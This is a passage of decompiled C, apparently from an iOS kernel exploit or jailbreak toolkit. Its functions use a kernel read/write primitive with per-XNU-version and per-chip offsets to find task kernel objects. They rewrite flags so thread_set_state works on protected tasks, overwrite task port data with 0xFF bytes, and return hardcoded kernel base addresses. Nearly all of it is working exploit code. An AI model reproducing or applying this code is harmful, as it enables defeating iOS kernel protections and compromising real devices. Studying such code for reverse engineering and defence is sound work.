        mach_msg_type_number_t a6)
{
  bool v11; // zf
  int v12; // w20
  int xnuMajorVersion; // w8
  bool v15; // cc
  int v16; // w8
  unsigned int v17; // w28
  int v18; // w9
  unsigned int v19; // w26
  int v20; // w27
  unsigned int v21; // w24
  mach_port_t v22; // w0
  unsigned __int64 v23; // x0
  unsigned __int64 v24; // x25
  int v25; // w25
  unsigned __int64 v26; // x0
  unsigned __int64 v27; // x26
  __int64 v28; // x28
  __int64 v29; // x26
  int v30; // w24
  uint32_t bufSize[3]; // [xsp+4h] [xbp-6Ch] BYREF
  __int64 v32; // [xsp+10h] [xbp-60h] BYREF
  int v33; // [xsp+1Ch] [xbp-54h] BYREF

  if ( krwCtx->xnuVersionPacked < XNU_VERSION_PACKED(7195, 0, 46, 0, 0)
    || ((krwCtx->flags & KRW_CTX_FLAG_CPU_A12_TO_A17_OR_SELF_TASK_PORT_MASK) != 0 ? (v11 = mach_task_self_ == a2) : (v11 = 1), v11) )
  {
    v12 = thread_set_state_with_kobj_offset(krwCtx, a3, a4, a5, a6);
    return v12 == 0;
  }
  v33 = 0;
  xnuMajorVersion = krwCtx->xnuMajorVersion;
  if ( xnuMajorVersion > 8791 )
  {
    if ( xnuMajorVersion != 8792 && xnuMajorVersion != 8796 && xnuMajorVersion != 10002 )
      return 0;
  }
  else if ( (unsigned int)(xnuMajorVersion - 8019) >= 2 )
  {
    if ( xnuMajorVersion != 7195 )
      return 0;
    if ( krw_ctx_has_flag(krwCtx, KRW_CTX_FLAG_CPU_A14) )
    {
      v15 = krwCtx->xnuVersionPacked > XNU_VERSION_PACKED(7195, 100, 325, 1023, 1023);
      v16 = 1304;
    }
    else
    {
      if ( !krw_ctx_has_flag(krwCtx, KRW_CTX_FLAG_CPU_A13) )
      {
        if ( !krw_ctx_has_flag(krwCtx, KRW_CTX_FLAG_CPU_A12) )
        {
          v17 = 0;
LABEL_42:
          v21 = v17 - 9;
          v20 = 1;
          v19 = 1;
          goto LABEL_43;
        }
        v15 = krwCtx->xnuVersionPacked > XNU_VERSION_PACKED(7195, 100, 325, 1023, 1023);
        v16 = 1288;
        v18 = 352;
LABEL_26:
        if ( v15 )
          v17 = v18;
        else
          v17 = v16;
        goto LABEL_42;
      }
      v15 = krwCtx->xnuVersionPacked > XNU_VERSION_PACKED(7195, 100, 325, 1023, 1023);
      v16 = 1296;
    }
    v18 = 360;
    goto LABEL_26;
  }
  if ( krw_ctx_has_flag(krwCtx, KRW_CTX_FLAG_CPU_A17) )
  {
    v17 = 448;
  }
  else if ( krw_ctx_has_flag(krwCtx, KRW_CTX_FLAG_CPU_A15_A16_MASK) )
  {
    v17 = 368;
  }
  else if ( krw_ctx_has_flag(krwCtx, KRW_CTX_FLAG_CPU_A13_A14_MASK) )
  {
    v17 = 360;
  }
  else if ( krw_ctx_has_flag(krwCtx, KRW_CTX_FLAG_CPU_A12) )
  {
    v17 = 352;
  }
  else
  {
    v17 = 0;
  }
  if ( krwCtx->xnuMajorVersion < 8792 )
    goto LABEL_42;
  v17 -= 8;
  if ( krw_ctx_has_flag(krwCtx, KRW_CTX_FLAG_CPU_A12) )
  {
    v19 = 4;
    v20 = 2;
    v21 = 228;
  }
  else
  {
    if ( krw_ctx_has_flag(krwCtx, KRW_CTX_FLAG_CPU_A17) )
      v21 = 316;
    else
      v21 = 236;
    v19 = 4;
    v20 = 2;
  }
LABEL_43:
  if ( !v17 )
    return 0;
  v22 = mach_thread_self();
  v23 = get_task_kobject_addr(krwCtx, v22);
  if ( !v23 )
    return 0;
  v24 = v23;
  bufSize[0] = v19;
  v32 = 0;
  if ( !(unsigned int)krw_read_thunk(krwCtx, v23 + v17, 8, &v32) )
    return 0;
  if ( !(unsigned int)krw_read_thunk(krwCtx, v24 + v21, v19, &v33) )
    return 0;
  v25 = v33;
  v26 = get_task_kobject_addr(krwCtx, a3);
  if ( !v26 )
    return 0;
  v27 = v26;
  *(uint64_t *)&bufSize[1] = 0;
  v28 = v26 + v17;
  if ( !(unsigned int)krw_read_thunk(krwCtx, v28, 8, &bufSize[1]) )
    return 0;
  v29 = v27 + v21;
  if ( !(unsigned int)krw_read_thunk(krwCtx, v29, bufSize[0], &v33) )
    return 0;
  v30 = v33;
  if ( v32 != *(uint64_t *)&bufSize[1] && !(unsigned int)kwrite_with_retry(krwCtx, v28, (__int64)&v32, 8) )
    return 0;
  if ( (v25 & v20) == 0 || (v30 & v20) != 0 )
  {
    v12 = thread_set_state_with_kobj_offset(krwCtx, a3, a4, a5, a6);
  }
  else
  {
    v33 = (v33 & ~v20) | (v25 & v20);
    if ( !(unsigned int)kwrite_with_retry(krwCtx, v29, (__int64)&v33, bufSize[0]) )
      return 0;
    v12 = thread_set_state_with_kobj_offset(krwCtx, a3, a4, a5, a6);
    v33 &= ~v20;
    if ( !(unsigned int)kwrite_with_retry(krwCtx, v29, (__int64)&v33, bufSize[0]) )
      return 0;
  }
  if ( v32 == *(uint64_t *)&bufSize[1] || (unsigned int)kwrite_with_retry(krwCtx, v28, (__int64)&bufSize[1], 8) )
    return v12 == 0;
  return 0;
}

//----- (000000000003C25C) ----------------------------------------------------
__int64 __fastcall thread_set_state_with_kobj_offset(
        struct_krwCtx *krwCtx,
        thread_act_t target_act,
        thread_state_flavor_t flavor,
        thread_state_t new_state,
        mach_msg_type_number_t new_stateCnt)
{
  int xnuMajorVersion; // w25
  __int64 v11; // x24
  __int64 v12; // x24
  __int64 v13; // x20
  unsigned __int64 v14; // x0
  __int16 v16; // [xsp+Ch] [xbp-44h] BYREF
  __int16 v17; // [xsp+Eh] [xbp-42h] BYREF

  v17 = 0;
  xnuMajorVersion = krwCtx->xnuMajorVersion;
  if ( xnuMajorVersion < 8796 )
  {
    v12 = 0;
  }
  else
  {
    if ( krw_ctx_has_flag(krwCtx, KRW_CTX_FLAG_CPU_A17) )
    {
      v11 = 192;
    }
    else if ( krw_ctx_has_flag(krwCtx, KRW_CTX_FLAG_CPU_A11_TO_A17_OR_SELF_TASK_PORT_MASK) )
    {
      v11 = 112;
    }
    else
    {
      v11 = 184;
    }
    v14 = get_task_kobject_addr(krwCtx, target_act);
    if ( !v14 )
      return 5;
    v12 = v14 + v11;
    if ( !(unsigned int)krw_read_thunk(krwCtx, v12, 2, &v17) )
      return 5;
    if ( (v17 & 0x80000000) == 0 )
    {
      v16 = v17 | 0x8000;
      if ( !(unsigned int)kwrite_with_retry(krwCtx, v12, (__int64)&v16, 2) )
        return 5;
    }
  }
  v13 = thread_set_state(target_act, flavor, new_state, new_stateCnt);
  if ( xnuMajorVersion >= 8796 && (v17 & 0x80000000) == 0 )
    kwrite_with_retry(krwCtx, v12, (__int64)&v17, 2);
  return v13;
}

//----- (000000000003C398) ----------------------------------------------------
unsigned __int64 __fastcall find_kernel_base_ptr(struct_krwCtx *krwCtx)
{
  unsigned __int64 result; // x0
  int xnuMajorVersion; // w8
  bool v4; // zf
  int v5; // w9

  result = 0;
  xnuMajorVersion = krwCtx->xnuMajorVersion;
  if ( xnuMajorVersion > 8791 )
  {
    v4 = xnuMajorVersion == 8792 || xnuMajorVersion == 10002;
    v5 = 8796;
  }
  else
  {
    v4 = (unsigned int)(xnuMajorVersion - 8019) < 2 || xnuMajorVersion == 6153;
    v5 = 7195;
  }
  if ( v4 || xnuMajorVersion == v5 )
  {
    if ( krw_ctx_has_flag(krwCtx, KRW_CTX_FLAG_CS_TXM) )
    {
      return 0xFFFFFFF027004000LL;
    }
    else if ( krw_ctx_has_flag(krwCtx, KRW_CTX_FLAG_CS_PPL_MAYBE) )
    {
      return 0xFFFFFE0007004000LL;
    }
    else
    {
      return 0xFFFFFFF007004000LL;
    }
  }
  return result;
}

//----- (000000000003C450) ----------------------------------------------------
__int64 __fastcall refresh_target_task_port(struct_krwCtx *krwCtx, unsigned int a2, int a3, uint8_t *a4)
{
  __int64 v8; // x19
  unsigned __int64 v9; // x0
  unsigned __int64 v10; // x24
  unsigned __int64 v11; // x25
  int v12; // w8
  int v15; // w28
  unsigned int v16; // w0
  __int64 v17; // x25
  unsigned __int64 v18; // x26
  unsigned int v19; // w25
  int has_flag; // w0
  int v21; // w9
  int v22; // w10
  int v24; // w0
  __int64 v25; // x24
  unsigned __int64 v26; // x24
  int v28; // w0
  uint32_t length[3]; // [xsp+4h] [xbp-28Ch] BYREF
  int v31; // [xsp+10h] [xbp-280h] BYREF
  int v32; // [xsp+14h] [xbp-27Ch] BYREF
  __int64 address; // [xsp+18h] [xbp-278h] BYREF
  uint8_t newBytes[0x200]; // [xsp+20h] [xbp-270h] BYREF

  v8 = 163855;
  address = 0;
  v9 = get_task_kobject_addr(krwCtx, a2);
  *(uint64_t *)&length[1] = 0;
  if ( !v9 )
    return 163854;
  v10 = v9;
  v11 = krwCtx->xnuVersionPacked;
  v12 = krwCtx->xnuMajorVersion;
  if ( v11 <= XNU_VERSION_PACKED(8019, 60, 39, 1023, 1023) )
  {
    if ( v12 == 8019 )
    {
      if ( krw_ctx_has_flag(krwCtx, KRW_CTX_FLAG_CPU_A15) )
      {
        v19 = 1016;
      }
      else if ( krw_ctx_has_flag(krwCtx, KRW_CTX_FLAG_CPU_A12_TO_A17_OR_SELF_TASK_PORT_MASK) )
      {
        v19 = 1000;
      }
      else
      {
        v19 = 976;
      }
    }
    else
    {
      if ( v12 != 7195 )
        return 163847;
      has_flag = krw_ctx_has_flag(krwCtx, KRW_CTX_FLAG_CPU_A12_TO_A17_OR_SELF_TASK_PORT_MASK);
      if ( has_flag )
        v21 = 976;
      else
        v21 = 960;
      if ( has_flag )
        v22 = 992;
      else
        v22 = 968;
      if ( v11 >= XNU_VERSION_PACKED(7195, 100, 326, 0, 0) )
        v19 = v22;
      else
        v19 = v21;
    }
    v18 = v10 + v19;
    if ( !kread_physmap_decorated(krwCtx, v18, (unsigned __int64 *)&address) )
      return v8;
    length[0] = 0;
  }
  else
  {
    if ( v12 == 8792 || v12 == 10002 || v12 == 8796 )
      v15 = 72;
    else
      v15 = 0;
    v16 = get_ptrauth_data_ptr_offset(krwCtx);
    if ( !kread_physmap_decorated(krwCtx, v10 + v16, (unsigned __int64 *)&length[1]) )
      return v8;
    if ( !validate_kaddr_range(krwCtx, *(__int64 *)&length[1]) )
      return 163878;
    v17 = *(uint64_t *)&length[1];
    v18 = v17 + (unsigned int)get_version_adjusted_offset(krwCtx);
    if ( !kread_physmap_decorated(krwCtx, v18, (unsigned __int64 *)&address) )
      return v8;
    length[0] = v15;
    v19 = 0;
  }
  if ( !address )
    goto LABEL_58;
  if ( !check_kaddr_in_physmap(krwCtx, address) )
    return 163878;
  if ( length[0] )
  {
    memset(newBytes, 0xFF, length[0]);
    if ( !(unsigned int)kwritebuf_universal(krwCtx, address, newBytes, length[0]) )
      return 163856;
    goto LABEL_58;
  }
  if ( krwCtx->krw_pipe_0 == -1
    || krwCtx->krw_pipe_1 == -1
    || krwCtx->iosurfaceFd_size4 == -1
    || !krwCtx->gap_0x218 )
  {
    if ( !a3 )
      goto LABEL_47;
  }
  else if ( krwCtx->gap_0xC && (a3 & 1) == 0 )
  {
LABEL_47:
    if ( !kwrite64_dispatch(krwCtx, v18, 0) )
      return 163856;
    goto LABEL_58;
  }
  if ( !kread_u32(krwCtx, address - 16, &v31) )
    return v8;
  if ( (v31 & 0x7FFFFFFF) == 0x4A616371 )
  {
    if ( !kread_u32(krwCtx, address - 12, &v32) )
      return v8;
    if ( (unsigned int)(v32 - 17) > 0x1DF )
      return 163857;
    memset(newBytes, 0xFF, (unsigned int)(v32 - 16));
    if ( !(unsigned int)kwrite_with_retry(krwCtx, address, (__int64)newBytes, (unsigned int)(v32 - 16)) )
      return 163856;
  }
  else
  {
    if ( !a4 )
      return 163856;
    *a4 = 1;
  }
LABEL_58:
  if ( krwCtx->xnuVersionPacked <= XNU_VERSION_PACKED(8019, 60, 39, 1023, 1023) )
  {
    v26 = v10 + v19 + krwCtx->stride_0x168;
  }
  else
  {
    v25 = *(uint64_t *)&length[1];
    v26 = v25 + (unsigned int)get_context_version_offset_112(krwCtx);
  }
  if ( !kread_physmap_decorated(krwCtx, v26, (unsigned __int64 *)&address) )
    return v8;
  if ( !address )
    goto LABEL_85;
  if ( !check_kaddr_in_physmap(krwCtx, address) )
    return 163878;
  if ( length[0] )
  {
    memset(newBytes, 0xFF, length[0]);
    if ( !(unsigned int)kwritebuf_universal(krwCtx, address, newBytes, length[0]) )
      return 163856;
    goto LABEL_85;
  }
  if ( krwCtx->krw_pipe_0 == -1
    || krwCtx->krw_pipe_1 == -1
    || krwCtx->iosurfaceFd_size4 == -1
    || !krwCtx->gap_0x218 )
  {
    if ( !a3 )
      goto LABEL_74;
  }
  else if ( krwCtx->gap_0xC && (a3 & 1) == 0 )
  {
LABEL_74:
    if ( !kwrite64_dispatch(krwCtx, v26, 0) )
      return 163856;
    goto LABEL_85;
  }
  if ( !kread_u32(krwCtx, address - 16, &v31) )
    return v8;
  if ( (v31 & 0x7FFFFFFF) != 0x4A616371 )
  {
    if ( a4 )
    {
      *a4 = 1;
      goto LABEL_85;
    }
    return 163856;
  }
  if ( !kread_u32(krwCtx, address - 12, &v32) )
    return v8;
  if ( (unsigned int)(v32 - 17) > 0x1DF )
    return 163857;
  memset(newBytes, 0xFF, (unsigned int)(v32 - 16));
  if ( !(unsigned int)kwrite_with_retry(krwCtx, address, (__int64)newBytes, (unsigned int)(v32 - 16)) )
    return 163856;
LABEL_85:
  if ( mach_task_self_ == a2 && (!a4 || !*a4) )
    krw_ctx_set_flag(krwCtx, KRW_CTX_FLAG_SELF_TASK_PORT_CLEARED);
  return 0;
}
// 3C6D0: variable 'v24' is possibly undefined
// 3C880: variable 'v28' is possibly undefined

